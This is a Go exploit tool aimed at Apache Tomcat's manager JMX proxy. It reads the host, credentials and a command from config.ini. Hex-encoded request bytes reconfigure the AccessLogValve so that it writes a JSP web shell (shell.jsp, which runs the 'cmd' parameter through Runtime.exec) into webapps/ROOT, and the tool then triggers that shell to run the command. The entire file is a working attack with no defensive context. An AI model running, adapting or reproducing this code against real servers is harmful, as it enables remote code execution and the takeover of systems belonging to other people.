package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strings"
	"time"
)

var PACK_NORMAL = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0a,
	0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31,
	0x3a, 0x38, 0x30, 0x38, 0x30, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f,
	0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0a, 0x0a,
}

var PACK01 = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x2f, 0x6a, 0x6d,
	0x78, 0x70, 0x72, 0x6f, 0x78, 0x79, 0x2f, 0x3f, 0x73, 0x65, 0x74, 0x3d, 0x43, 0x61, 0x74,
	0x61, 0x6c, 0x69, 0x6e, 0x61, 0x3a, 0x74, 0x79, 0x70, 0x65, 0x3d, 0x56, 0x61, 0x6c, 0x76,
	0x65, 0x2c, 0x68, 0x6f, 0x73, 0x74, 0x3d, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73,
	0x74, 0x2c, 0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x4c, 0x6f,
	0x67, 0x56, 0x61, 0x6c, 0x76, 0x65, 0x26, 0x61, 0x74, 0x74, 0x3d, 0x70, 0x61, 0x74, 0x74,
	0x65, 0x72, 0x6e, 0x26, 0x76, 0x61, 0x6c, 0x3d, 0x25, 0x32, 0x35, 0x25, 0x37, 0x62, 0x25,
	0x37, 0x30, 0x25, 0x37, 0x64, 0x25, 0x36, 0x39, 0x25, 0x32, 0x30, 0x25, 0x35, 0x32, 0x25,
	0x37, 0x35, 0x25, 0x36, 0x65, 0x25, 0x37, 0x34, 0x25, 0x36, 0x39, 0x25, 0x36, 0x64, 0x25,
	0x36, 0x35, 0x25, 0x32, 0x65, 0x25, 0x36, 0x37, 0x25, 0x36, 0x35, 0x25, 0x37, 0x34, 0x25,
	0x35, 0x32, 0x25, 0x37, 0x35, 0x25, 0x36, 0x65, 0x25, 0x37, 0x34, 0x25, 0x36, 0x39, 0x25,
	0x36, 0x64, 0x25, 0x36, 0x35, 0x25, 0x32, 0x38, 0x25, 0x32, 0x39, 0x25, 0x32, 0x65, 0x25,
	0x36, 0x35, 0x25, 0x37, 0x38, 0x25, 0x36, 0x35, 0x25, 0x36, 0x33, 0x25, 0x32, 0x38, 0x25,
	0x37, 0x32, 0x25, 0x36, 0x35, 0x25, 0x37, 0x31, 0x25, 0x37, 0x35, 0x25, 0x36, 0x35, 0x25,
	0x37, 0x33, 0x25, 0x37, 0x34, 0x25, 0x32, 0x65, 0x25, 0x36, 0x37, 0x25, 0x36, 0x35, 0x25,
	0x37, 0x34, 0x25, 0x35, 0x30, 0x25, 0x36, 0x31, 0x25, 0x37, 0x32, 0x25, 0x36, 0x31, 0x25,
	0x36, 0x64, 0x25, 0x36, 0x35, 0x25, 0x37, 0x34, 0x25, 0x36, 0x35, 0x25, 0x37, 0x32, 0x25,
	0x32, 0x38, 0x25, 0x32, 0x32, 0x25, 0x36, 0x33, 0x25, 0x36, 0x64, 0x25, 0x36, 0x34, 0x25,
	0x32, 0x32, 0x25, 0x32, 0x39, 0x25, 0x32, 0x39, 0x25, 0x33, 0x62, 0x25, 0x32, 0x30, 0x25,
	0x32, 0x35, 0x25, 0x37, 0x62, 0x25, 0x37, 0x33, 0x25, 0x37, 0x64, 0x25, 0x36, 0x39, 0x20,
	0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20,
	0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x3a, 0x38, 0x30, 0x38, 0x30, 0x0a,
	0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f,
	0x73, 0x65, 0x0a, 0x41, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x61, 0x74, 0x69, 0x6f,
	0x6e, 0x3a, 0x20, 0x42, 0x61, 0x73, 0x69, 0x63, 0x20,
}

var PACK02 = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x2f, 0x6a, 0x6d,
	0x78, 0x70, 0x72, 0x6f, 0x78, 0x79, 0x2f, 0x3f, 0x73, 0x65, 0x74, 0x3d, 0x43, 0x61, 0x74,
	0x61, 0x6c, 0x69, 0x6e, 0x61, 0x3a, 0x74, 0x79, 0x70, 0x65, 0x3d, 0x56, 0x61, 0x6c, 0x76,
	0x65, 0x2c, 0x68, 0x6f, 0x73, 0x74, 0x3d, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73,
	0x74, 0x2c, 0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x4c, 0x6f,
	0x67, 0x56, 0x61, 0x6c, 0x76, 0x65, 0x26, 0x61, 0x74, 0x74, 0x3d, 0x73, 0x75, 0x66, 0x66,
	0x69, 0x78, 0x26, 0x76, 0x61, 0x6c, 0x3d, 0x2e, 0x6a, 0x73, 0x70, 0x20, 0x48, 0x54, 0x54,
	0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x31, 0x32, 0x37,
	0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x3a, 0x38, 0x30, 0x38, 0x30, 0x0a, 0x43, 0x6f, 0x6e,
	0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0a,
	0x41, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20,
	0x42, 0x61, 0x73, 0x69, 0x63, 0x20,
}

var PACK03 = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x2f, 0x6a, 0x6d,
	0x78, 0x70, 0x72, 0x6f, 0x78, 0x79, 0x2f, 0x3f, 0x73, 0x65, 0x74, 0x3d, 0x43, 0x61, 0x74,
	0x61, 0x6c, 0x69, 0x6e, 0x61, 0x3a, 0x74, 0x79, 0x70, 0x65, 0x3d, 0x56, 0x61, 0x6c, 0x76,
	0x65, 0x2c, 0x68, 0x6f, 0x73, 0x74, 0x3d, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73,
	0x74, 0x2c, 0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x4c, 0x6f,
	0x67, 0x56, 0x61, 0x6c, 0x76, 0x65, 0x26, 0x61, 0x74, 0x74, 0x3d, 0x70, 0x72, 0x65, 0x66,
	0x69, 0x78, 0x26, 0x76, 0x61, 0x6c, 0x3d, 0x73, 0x68, 0x65, 0x6c, 0x6c, 0x20, 0x48, 0x54,
	0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x31, 0x32,
	0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x3a, 0x38, 0x30, 0x38, 0x30, 0x0a, 0x43, 0x6f,
	0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65,
	0x0a, 0x41, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x3a,
	0x20, 0x42, 0x61, 0x73, 0x69, 0x63, 0x20,
}

var PACK04 = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x2f, 0x6a, 0x6d,
	0x78, 0x70, 0x72, 0x6f, 0x78, 0x79, 0x2f, 0x3f, 0x73, 0x65, 0x74, 0x3d, 0x43, 0x61, 0x74,
	0x61, 0x6c, 0x69, 0x6e, 0x61, 0x3a, 0x74, 0x79, 0x70, 0x65, 0x3d, 0x56, 0x61, 0x6c, 0x76,
	0x65, 0x2c, 0x68, 0x6f, 0x73, 0x74, 0x3d, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73,
	0x74, 0x2c, 0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x4c, 0x6f,
	0x67, 0x56, 0x61, 0x6c, 0x76, 0x65, 0x26, 0x61, 0x74, 0x74, 0x3d, 0x64, 0x69, 0x72, 0x65,
	0x63, 0x74, 0x6f, 0x72, 0x79, 0x26, 0x76, 0x61, 0x6c, 0x3d, 0x77, 0x65, 0x62, 0x61, 0x70,
	0x70, 0x73, 0x2f, 0x52, 0x4f, 0x4f, 0x54, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e,
	0x31, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30,
	0x2e, 0x31, 0x3a, 0x38, 0x30, 0x38, 0x30, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74,
	0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0a, 0x41, 0x75, 0x74, 0x68,
	0x6f, 0x72, 0x69, 0x7a, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x42, 0x61, 0x73, 0x69,
	0x63, 0x20,
}

var PACK05 = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x2f, 0x6a, 0x6d,
	0x78, 0x70, 0x72, 0x6f, 0x78, 0x79, 0x2f, 0x3f, 0x73, 0x65, 0x74, 0x3d, 0x43, 0x61, 0x74,
	0x61, 0x6c, 0x69, 0x6e, 0x61, 0x3a, 0x74, 0x79, 0x70, 0x65, 0x3d, 0x56, 0x61, 0x6c, 0x76,
	0x65, 0x2c, 0x68, 0x6f, 0x73, 0x74, 0x3d, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73,
	0x74, 0x2c, 0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x4c, 0x6f,
	0x67, 0x56, 0x61, 0x6c, 0x76, 0x65, 0x26, 0x61, 0x74, 0x74, 0x3d, 0x66, 0x69, 0x6c, 0x65,
	0x44, 0x61, 0x74, 0x65, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x26, 0x76, 0x61, 0x6c, 0x3d,
	0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a,
	0x20, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x3a, 0x38, 0x30, 0x38, 0x30,
	0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c,
	0x6f, 0x73, 0x65, 0x0a, 0x41, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x61, 0x74, 0x69,
	0x6f, 0x6e, 0x3a, 0x20, 0x42, 0x61, 0x73, 0x69, 0x63, 0x20,
}

var PACK_WRITE = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0a,
	0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31,
	0x3a, 0x38, 0x30, 0x38, 0x30, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f,
	0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0a, 0x70, 0x3a, 0x20, 0x3c, 0x25, 0x0a,
	0x73, 0x3a, 0x20, 0x25, 0x3e, 0x2f, 0x2f, 0x0a, 0x0a,
}

var PACK_EXP_PREFIX = []byte{
	0x47, 0x45, 0x54, 0x20, 0x2f, 0x73, 0x68, 0x65, 0x6c, 0x6c, 0x2e, 0x6a, 0x73, 0x70, 0x3f,
	0x63, 0x6d, 0x64, 0x3d,
}

var PACK_EXP_SUFFIX = []byte{
	0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a,
	0x20, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x3a, 0x38, 0x30, 0x38, 0x30,
	0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c,
	0x6f, 0x73, 0x65, 0x0a, 0x0a,
}

var (
	host     string
	port     string
	username string
	password string
	cmd      string
)

func main() {
	fmt.Println("[*] start parse config")
	config, err := ioutil.ReadFile("config.ini")
	if err != nil {
		fmt.Println("[-] need config.ini file")
		os.Exit(0)
	}
	parse(config)
	fmt.Println("[*] start build")
	addr := fmt.Sprintf("%s:%s", host, port)
	auth := fmt.Sprintf("%s:%s", username, password)
	authByte := []byte(base64.StdEncoding.EncodeToString([]byte(auth)))
	cmdBytes := []byte(cmd)
	fmt.Println("[*] build data")
	PACK01 = append(PACK01, authByte...)
	PACK01 = append(PACK01, 0x0a, 0x0a)
	PACK02 = append(PACK02, authByte...)
	PACK02 = append(PACK02, 0x0a, 0x0a)
	PACK03 = append(PACK03, authByte...)
	PACK03 = append(PACK03, 0x0a, 0x0a)
	PACK04 = append(PACK04, authByte...)
	PACK04 = append(PACK04, 0x0a, 0x0a)
	PACK05 = append(PACK05, authByte...)
	PACK05 = append(PACK05, 0x0a, 0x0a)
	PACK_EXP_PREFIX = append(PACK_EXP_PREFIX, cmdBytes...)
	PACK_EXP := PACK_EXP_PREFIX
	PACK_EXP = append(PACK_EXP, PACK_EXP_SUFFIX...)
	fmt.Println("[*] send packet 01")
	sendTCP(addr, PACK01)
	fmt.Println("[*] send packet 02")
	sendTCP(addr, PACK02)
	fmt.Println("[*] send packet 03")
	sendTCP(addr, PACK03)
	fmt.Println("[*] send packet 04")
	sendTCP(addr, PACK04)
	fmt.Println("[*] send packet 05")
	sendTCP(addr, PACK05)
	fmt.Println("[*] send packet write")
	sendTCP(addr, PACK_WRITE)
	fmt.Println("[*] send packet normal")
	sendTCP(addr, PACK_NORMAL)
	fmt.Println("[*] send data finish")
	fmt.Println("[*] start exploit...")
	time.Sleep(time.Second * 5)
	sendTCP(addr, PACK_EXP)
	sendTCP(addr, PACK_EXP)
	sendTCP(addr, PACK_EXP)
}

func parse(config []byte) {
	temp := strings.Split(string(config), "\n")
	for _, item := range temp {
		item := strings.Trim(item, "\r")
		if strings.HasPrefix(item, "#") {
			continue
		}
		t := strings.Split(item, "=")
		if len(t) < 2 {
			fmt.Println("[-] error config file")
			os.Exit(0)
		}
		key := t[0]
		value := t[1]
		switch key {
		case "host":
			host = value
		case "port":
			port = value
		case "username":
			username = value
		case "password":
			password = value
		case "cmd":
			cmd = value
		default:
			fmt.Println("[-] error config item")
			os.Exit(0)
		}
	}
	if strings.TrimSpace(host) == "" ||
		strings.TrimSpace(port) == "" ||
		strings.TrimSpace(username) == "" ||
		strings.TrimSpace(password) == "" ||
		strings.TrimSpace(cmd) == "" {
		fmt.Println("[-] check your config")
		os.Exit(0)
	}
}

func sendTCP(addr string, packet []byte) {
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil || conn == nil {
		fmt.Println("[-] connection error")
		return
	}
	defer func(conn net.Conn) {
		_ = conn.Close()
	}(conn)
	_, err = conn.Write(packet)
	if err != nil {
		fmt.Println("[-] connection error")
	}
	_, _ = ioutil.ReadAll(conn)
	time.Sleep(time.Millisecond * 500)
}
